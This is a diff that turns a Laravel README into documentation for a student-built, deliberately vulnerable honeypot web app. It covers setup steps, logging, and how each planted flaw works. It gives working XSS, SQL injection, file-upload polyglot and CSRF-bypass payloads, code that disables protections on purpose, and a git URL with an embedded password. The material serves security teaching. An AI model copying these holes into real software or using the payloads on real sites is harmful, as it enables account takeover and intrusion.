@@ -1,66 +1,620 @@
-<p align="center"><a href="https://laravel.com" target="_blank"><img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="400"></a></p>
+<p align="center"><a href="http://rgp04.hp.ti.howest.be/" target="_blank"><img alt=Honeypot" src="https://c.tenor.com/lVHG0McBDqMAAAAi/mochi-peach.gif" width="150"></a></p>
 
-<p align="center">
-<a href="https://travis-ci.org/laravel/framework"><img src="https://travis-ci.org/laravel/framework.svg" alt="Build Status"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/dt/laravel/framework" alt="Total Downloads"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/v/laravel/framework" alt="Latest Stable Version"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/l/laravel/framework" alt="License"></a>
-</p>
+## About Honeypot
 
-## About Laravel
+**Honeypot** is a web application that offers the visitors the chance of testing five of the top security vulnerabilities. We log the attackers attempts, rank their successes compared to other attackers, and block any intrusion from further advances by controlling the outcome of our exposed vulnerabilities. 
 
-Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
+## Challenges
+We introduce the concept of challenge failed attempts in a psychological punishment manner, for every failed attempt, a kitten dies. Those results are displayed in a public ranking for everyone to see: name, challenges solved and kittens killed. We also show the user a kitten avatar that evolves through a series of emotional statutes the more kittens you kill. 
 
-- [Simple, fast routing engine](https://laravel.com/docs/routing).
-- [Powerful dependency injection container](https://laravel.com/docs/container).
-- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
-- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
-- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
-- [Robust background job processing](https://laravel.com/docs/queues).
-- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).
+Our five exposed security vulnerabilities are:
+- Broken Access Control
+- Persistent XSS
+- Mass Assignment
+- SQL Injection
+- Image Upload Bypass
 
-Laravel is accessible, powerful, and provides tools required for large, robust applications.
+**Broken Access Control** allows a user Log in by guessing the default administrator account and brute-forcing its password.
 
-## Learning Laravel
+**Persistent XSS** allows a user supplying untrusted input that, when loaded without proper validation or escaping, will execute a malicious action.
 
-Laravel has the most extensive and thorough [documentation](https://laravel.com/docs) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
+**Mass Assignment** allows a user passing an unexpected parameter that will escalate the user to admin.
 
-If you don't feel like reading, [Laracasts](https://laracasts.com) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+**SQL Injection** allows a user interfere with the queries that the web makes to its database to Log in with the default administrator account.
 
-## Laravel Sponsors
+**Image Upload Bypass** allows a user bypass the validation in the avatar uploader to send a file that is not an image.
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://patreon.com/taylorotwell).
 
-### Premium Partners
+## Technology stack
+The technology stack used on the server side (Debian 11.x) is based on these dependencies:
+- apache2
+- php7.4
+- mariadb
+- laravel
+- composer
+- npm
+- elastic stack
+- ansible
 
-- **[Vehikl](https://vehikl.com/)**
-- **[Tighten Co.](https://tighten.co)**
-- **[Kirschbaum Development Group](https://kirschbaumdevelopment.com)**
-- **[64 Robots](https://64robots.com)**
-- **[Cubet Techno Labs](https://cubettech.com)**
-- **[Cyber-Duck](https://cyber-duck.co.uk)**
-- **[Many](https://www.many.co.uk)**
-- **[Webdock, Fast VPS Hosting](https://www.webdock.io/en)**
-- **[DevSquad](https://devsquad.com)**
-- **[Curotec](https://www.curotec.com/services/technologies/laravel/)**
-- **[OP.GG](https://op.gg)**
-- **[CMS Max](https://www.cmsmax.com/)**
-- **[WebReinvent](https://webreinvent.com/?utm_source=laravel&utm_medium=github&utm_campaign=patreon-sponsors)**
-- **[Lendio](https://lendio.com)**
-- **[Romega Software](https://romegasoftware.com)**
+**Apache** is the most widely used web server software. Developed and maintained by Apache Software Foundation, Apache is an open source software.
 
-## Contributing
+**MariaDB** Server is one of the most popular open source relational databases. It's made by the original developers of MySQL and guaranteed to stay open source.
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://laravel.com/docs/contributions).
+**PHP** is an acronym for "PHP: Hypertext Preprocessor" · PHP is a widely-used, open source scripting language
 
-## Code of Conduct
+**Laravel** is a popular PHP framework with expressive, elegant syntax that provides the tools required for creating powerful applications.
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://laravel.com/docs/contributions#code-of-conduct).
+**Composer** is a package manager commonly used in Laravel projects.
 
-## Security Vulnerabilities
+**Npm** is another package manager focused on js.
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [taylor@laravel.com](mailto:taylor@laravel.com). All security vulnerabilities will be promptly addressed.
+**Elastic Stack** is a group of open source products from Elastic designed to help users take data from any type of source and in any format and search, analyze, and visualize that data in real time.
 
-## License
+**Ansible** is a software tool that provides simple but powerful automation for cross-platform computer support.
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+## Developers
+
+This application was created by Group 04, formed by the second-year Computer Science cybersecurity students Eric Anllo, David Prada and Hossein Azar.
+
+
+## Setup process
+If you are interested in how to manually Setup this whole project in a fresh Debian 11.x machine, this is how:
+
+
+
+
+### Connect via ssh
+```
+ssh killerb@rgp04.hp.ti.howest.be
+```
+
+
+
+
+### Install Apache2
+
+```
+sudo apt install -y apache2
+```
+
+
+
+
+### Install PHP
+
+```
+sudo apt install -y php php-bcmath php-ctype php-fileinfo php-json php-mbstring php-mysql php-tokenizer php-xml php-curl
+```
+
+
+
+
+### Install Composer
+
+```
+sudo apt install -y composer
+```
+
+Add Composer to the PATH
+```
+echo 'export PATH="$PATH:$HOME/.config/composer/vendor/bin"' >> ~/.bashrc
+
+export PATH=~/.config/composer/vendor/bin:$PATH
+```
+
+
+
+
+### Install MariaDB
+
+```
+sudo apt install -y mariadb-server
+```
+
+Create honeypot database
+```
+sudo mysql -uroot -e "create database honeypot"
+```
+
+Configure a secure installation
+```
+sudo mysql_secure_installation
+```
+
+
+
+
+### Install NPM
+
+```
+sudo apt install -y npm
+```
+
+
+
+
+### Install Laravel
+
+The package can be installed via composer
+```
+composer global require laravel/installer
+```
+
+
+
+
+### Setup git
+
+```
+git clone https://killerb:2uSZMfUHrRFBdJTLwbMM@git.ti.howest.be/TI/2021-2022/s3/web-security/projects/project-26/honeypot.git
+```
+
+
+
+
+### Install dependencies
+
+```
+cd ~/honeypot
+
+composer update
+
+npm install
+```
+
+Compile CSS and JS
+```
+npm run dev
+```
+
+### Modify credentials in Laravel's .env file
+```
+nano ~/honeypot/.env
+```
+
+### Run project database migrations
+```
+php artisan migrate:fresh --seed
+```
+
+###  Create Symlinks
+Link the private avatars folder to the project's public folder
+```
+php artisan storage:link
+```
+
+Link the project files into apache2 websites folder
+```
+sudo ln -s ~/honeypot /var/www/honeypot
+```
+
+### Configure apache2 honeypot website
+```
+sudo nano /etc/apache2/sites-available/honeypot.conf
+```
+- Paste this content into the honeypot.conf file:
+```
+<VirtualHost *:80>
+    ServerName honeypot
+    ServerAdmin admin@example.com
+    DocumentRoot /var/www/honeypot/public
+
+    <Directory /var/www/honeypot>
+        Options FollowSymLinks
+        AllowOverride All
+        Require all granted
+    </Directory>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+```
+
+Enable apache2 rewrite module (for having pretty URLs without .php ending)
+```
+sudo a2enmod rewrite
+```
+
+Disable apache2 default site
+```
+sudo a2dissite 000-default.conf
+```
+
+Enable apache2 honeypot site
+```
+sudo a2ensite honeypot
+```
+
+Restart apache
+```
+sudo systemctl restart apache2
+```
+
+### Configure project's folder and file permissions
+```
+sudo chown -R www-data:www-data ~/honeypot/storage
+sudo chown -R www-data:www-data ~/honeypot/bootstrap
+
+sudo chmod -R ugo+rw ~/honeypot/storage
+sudo chmod -R ugo+rw ~/honeypot/bootstrap
+```
+
+Honeypot should be visible  http://rgp04.hp.ti.howest.be
+
+### Enabling HTTPS
+
+```
+sudo nano /etc/apache2/sites-available/honeypot-ssl.conf
+```
+
+```
+<IfModule mod_ssl.c>
+    <VirtualHost *:443>
+        ServerName honeypot
+        ServerAdmin admin@rgp04.hp.ti.howest.be/
+        DocumentRoot /var/www/honeypot/public
+    
+        <Directory /var/www/honeypot>
+            Options FollowSymLinks
+            AllowOverride All
+            Require all granted
+        </Directory>
+    
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+    
+        SSLEngine On
+        SSLCertificateFile      /etc/ssl/certs/ssl-cert-snakeoil.pem
+        SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
+    
+        <FilesMatch "\.(cgi|shtml|phtml|php)$">
+            SSLOptions +StdEnvVars
+        </FilesMatch>
+        <Directory /usr/lib/cgi-bin>
+            SSLOptions +StdEnvVars
+        </Directory>
+    </VirtualHost>
+</IfModule>
+```
+
+Enable SSL module in Apache2
+```
+sudo a2enmod ssl
+```
+
+Enable honepot-ssl in Apache2
+```
+sudo a2ensite honeypot-ssl
+```
+
+Edit honeypot.conf
+```
+Redirect / https://rgp04.hp.ti.howest.be/
+```
+
+Disable honepot in Apache2
+```
+sudo a2ensite honeypot
+```
+
+Restart Apache2
+```
+sudo systemctl restart apache2
+```
+
+Enable honepot in Apache2
+```
+sudo a2ensite honeypot
+```
+
+Restart Apache2
+```
+sudo systemctl restart apache2
+```
+
+Honeypot http should redirect to https  http://rgp04.hp.ti.howest.be
+Honeypot https should be visible  https://rgp04.hp.ti.howest.be
+
+### Disable Apache2 signatures
+We Hide Apache displays name & version by using ServerSignature Off in /etc/apache2/conf-enabled/security.conf
+
+### Setup Elasticsearch
+Finally, we configure Elastic Stack for logging
+
+
+## Logging
+We take care of advanced logging by using **events**, **listeners** and **observers**. We initiate an event on every action that is to be logged, then associate a Listener to it that will execute the action of logging. Observers are used to monitor Laravel internal interaction with the model User and the database, for every interaction we link an event and launch the respective listener.
+
+This is the list of Listeners:
+- LogAchievedBrokenAccessControl
+- LogAchievedImageUploadBypass
+- LogAchievedMassAssignment
+- LogAchievedSQLi
+- LogAchievedXSS
+- LogAttemptedBrokenAccessControl
+- LogAttemptedImageUploadBypass
+- LogAttemptedMassAssignment
+- LogAttemptedSQLi
+- LogAttemptedXSS
+- LogAuthenticated
+- LogAuthenticationAttempt
+- LogChallengeAttempted
+- LogChallengeCompleted
+- LogCreatedUser
+- LogCurrentDevice
+- LogDeletedUser
+- LogFailedLogin
+- LogLockout
+- LogOtherDeviceLogout
+- LogPasswordReset
+- LogRegisteredUser
+- LogSessionClosedUser
+- LogSuccessfulLogin
+- LogSuccessfulLogout
+- LogUpdatedUser
+- LogValidated
+- LogVerified
+
+
+## Controlling the vulnerabilities
+
+### Broken Authentication
+
+#### Disable CSRF security
+Laravel protects against Brute Force Attacks and CSRF attacks by using a randomized token on every form generation. If you use Burp with this protection enabled, you will only get 419 page expired responses.
+In order to use Burp and be able to brute force the login form with common users/passwords we need to disable it. This is how:
+
+You can Disable CSRF on few routes by editing App\Http\Middleware\VerifyCsrfToken
+```
+/**
+ * The URIs that should be excluded from CSRF verification.
+ *
+ * @var array
+ */
+protected $except = [
+    'login'
+];
+```
+
+#### Lower throttling security
+Now, brute force sends requests very fast continuously, and Laravel has a protection on how many requests you can send per minute, throttling. We need to also lower this protection by increasing the max attempts permitted.
+
+In your app/Http/Controllers/Auth/LoginController.php, you can add two properties:
+```
+class LoginController extends Controller
+{
+    // Throttling control
+    protected $maxAttempts = 30; // Default is 5
+    protected $decayMinutes = 1; // Default is 1
+
+    // ...
+}
+```
+
+After disabling and lowering this protections we can Brute Force using Burp Suite:
+1. Download a wordlist of 1000 common passwords
+2. Brute force the login form using Burp Suite (see video)
+3. Eventually we will find the password for the user admin
+
+Honeypot detection
+If the attacker uses this credentials to login, we can detect it, log the attempt, and disconnect the attacker.
+We do this via the middleware CheckIfHoneypotAdmin, by checking if the auth user is our "fake" admin (id=1) on all http web requests.
+
+
+
+### Persistent XSS
+
+XSS attacks are an output problem, Laravel encourages you to escape all output, regardless where it came from.
+Our output is generated by Blade. By default, Blade outputs values using {{ }} statements that automatically send it through PHP's htmlspecialchars function to prevent XSS attacks. We can skip this protection by using {!! !!} instead.
+
+A persistent XSS is possible when a web app takes user input and stores it into its servers. Then it is displayed in a harmful way. We will allow this vulnerability to happen in a User's name attribute, by removing escaped protections in this files:
+
+We allow unescapted user input in resources/views/partials/navbar.blade.php
+- This allows a user to confirm that a XSS Vulnerability exists
+```
+{!! Auth()->user()->name !!}
+```
+
+We allow unescapted user input in resources/views/users/row.blade.php
+- This loads the XSS Payload in the Admin Panel on an admin session
+- If the admin disables the user, the data will be escaped to prevent futher Payloads
+```
+<td class="align-middle">
+    @if($user->isEnabled())
+        {!! $user->name !!}
+    @else
+        {{ $user->name }}
+    @endif
+</td>
+```
+
+Lets exploit this, our goal is to disable all users. This is achieved by sending a PUT request to /users/{id}/disable. But this route is protected by CSRF, so we will disable it first. You can Disable CSRF on few routes by editing App\Http\Middleware\VerifyCsrfToken
+```
+/**
+ * The URIs that should be excluded from CSRF verification.
+ *
+ * @var array
+ */
+protected $except = [
+    'users/*/disable'
+];
+```
+
+We create a user with a username that contains the XSS Attack
+```
+<script>for(let i=0;i<100;i++){fetch("/users/"+i+"/disable",{method:"put"});}</script>
+```
+
+When the administrator loads the list of users he will disable all users.
+
+**This was however a little too advanced to achieve, and we give the challenge for good as long as a user introduces some form of XSS in an unsanitized input.**
+
+
+### Mass Assignment
+https://laravel.com/docs/8.x/eloquent#mass-assignment
+
+You may use the create method to "save" a new model using a single PHP statement. The inserted model instance will be returned to you by the method:
+```
+use App\Models\User;
+
+$user = User::create([
+'name' => 'Laura',
+]);
+```
+
+However, before using the create method, you will need to specify either a fillable or guarded property on your model class. These properties are required because all Eloquent models are protected against mass assignment vulnerabilities by default.
+
+A mass assignment vulnerability occurs when a user passes an unexpected HTTP request field and that field changes a column in your database that you did not expect. For example, a malicious user might send an is_admin parameter through an HTTP request, which is then passed to your model's create method, allowing the user to escalate themselves to an administrator.
+
+So, to get started, you should define which model attributes you want to make mass assignable. You may do this using the $fillable property on the model. For example, let's make the name attribute of our Flight model mass assignable:
+```
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Model;
+
+class User extends Model
+{
+    /**
+     * The attributes that are mass assignable.
+     *
+     * @var array
+     */
+    protected $fillable = ['name', 'is_admin'];
+}
+```
+
+Once you have specified which attributes are mass assignable, you may use the create method to insert a new record in the database. After receiving a POST request in the variable $request, we send it in full to the create method, which returns the newly created model instance:
+```
+#$user = User::create($request->all());
+
+```
+
+**Because we mass assigned 'is_admin', by setting this input field manually or using Burp in our user form, you can become an admin. Like: `is_admin=1`**
+
+
+### SQL Injection
+RawMethods  are Laravel’s neat way of letting developers use raw queries in only  specific parts of a database query. Some examples of Laravel’s  RawMethods include selectRaw, whereRaw, and orderByRaw. RawMethods, however, are vulnerable to SQL injection, which the official documentation  states in the following sentence: “Remember, Laravel can not guarantee  that any query using raw expressions is protected against SQL injection  vulnerabilities.”
+
+To demonstrate SQL injection in the whereRaw RawMethod, let’s take a look at the following code:
+```
+DB::table('posts')
+    ->select('postTitle', 'postBody')
+    ->whereRaw('id =' . $id)->first();
+```
+
+The code sample above should return a single row from the posts table. Or nothing if no post exists with the id specified. However, this code has a third unintended behavior.
+
+The value for id is defined by user input. Let’s look at what happens when a user enters the following value:
+```
+https://example.com/post/11 AND 1=1
+```
+
+The HTTP request above will lead to the execution of the following SQL query:
+```
+SELECT postTitle, postBody FROM posts WHERE id = 11 AND 1=1
+```
+
+The application will return the row with id 11 as expected. This is because 1=1 is always true. However, say a hacker changes 1=1 to something that’s always false, for example:
+```
+SELECT postTitle, postBody FROM posts WHERE id = 11 AND 1=2
+```
+
+This will cause the application to return zero rows or crash. This  behavior shows the existence of SQL injection vulnerability in the whereRaw part of our initial query.
+
+
+
+
+Prevention
+
+We recommend anyone using Laravel to avoid raw queries as much as they can.
+Doing  so, they can enjoy some of the security features already built in to  the framework. But if you must use raw queries, you should ensure you do  server-side validation of user inputs.
+One way to fix the vulnerability in our example is to validate that the value of id is an integer. You can do so with the following code:
+```
+$validator = Validator::make(['id' => $id], [
+    'id' => 'required|numeric'
+]);
+
+if ($validator->fails()) {
+    abort(404);
+}else {
+    //Run query
+}
+```
+
+Another fix is to rewrite the initial query using a parameterized query.
+```
+DB::table('posts')
+    ->select('postTitle', 'postBody')
+    ->whereRaw('id = ?', $id)->first();
+```
+
+We introduced a ? as a placeholder for the value of id and provided the actual value for id as a second parameter for whereRaw. 
+
+Or using Eloquent default query builder
+```
+Post::where('postTitle', 'postBody')
+    ->where('id', $id)->first();
+```
+
+**We achieve the challenge by using around 40 different SQLi commands that lead to login with user 'admin', for example `admin' --`**
+
+
+### Image Upload Bypass
+By bypassing laravel’s image validation we can achieve other attacks, first and most loved is XSS and as it is an stored xss we can write a full exploit that let us bypass CSRF and then we are free to do whatever we want with higher privileges.
+
+Notice that in our Controller file we specified that only image files with jpeg,png,jpg,gif,svg mimes are allowed, so to bypass this protection we need to intercept the upload POST request in Burp and change the mime type to image/jpeg. But Laravel logic also can still block some php or js files, so we go further into the exploitation using https://mh-nexus.de/en/hxd/
+
+Using this hex editor, open your "image" file and add these characters `FF D8 FF E0` at the very beginning of it.
+
+Al alternative is camouflaging the file as a GIF file using
+```
+GIF89a<?php
+phpinfo();
+?>
+```
+
+With any of this options you can upload this file bypassing Laravel 8 image validation.
+
+We could even upload a combined XSS attack that allows CSRF bypass like this:
+```
+����<html>
+<head>
+<title>Laravel Csrf Bypass</title>
+</head>
+<body>
+<script>
+function submitFormWithTokenJS(token) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", POST_URL, true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("_token=" + token + "&name=admin&password=1234567890");
+}
+function getTokenJS() {
+    var xhr = new XMLHttpRequest();
+    xhr.responseType = "document";
+    xhr.open("GET", "/login", true);
+    xhr.onload = function (e) {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            page = xhr.response
+            input = page.getElementsByTagName("input")[0];
+            alert("The token is: " + input.value);
+            submitFormWithTokenJS(input.value);
+        }
+    };
+    xhr.send(null);
+}
+getTokenJS();
+var POST_URL="/login"
+getTokenJS();
+</script>
+</html>
+```
+
+**But this was a bit too advanced for the challenges, so we kept it simple, as long as the user uploads a file with an extension not part of an image it will be achieved.**
+
+
+That is all, thank you for reading.
+
+###### David, Eric & Hossein
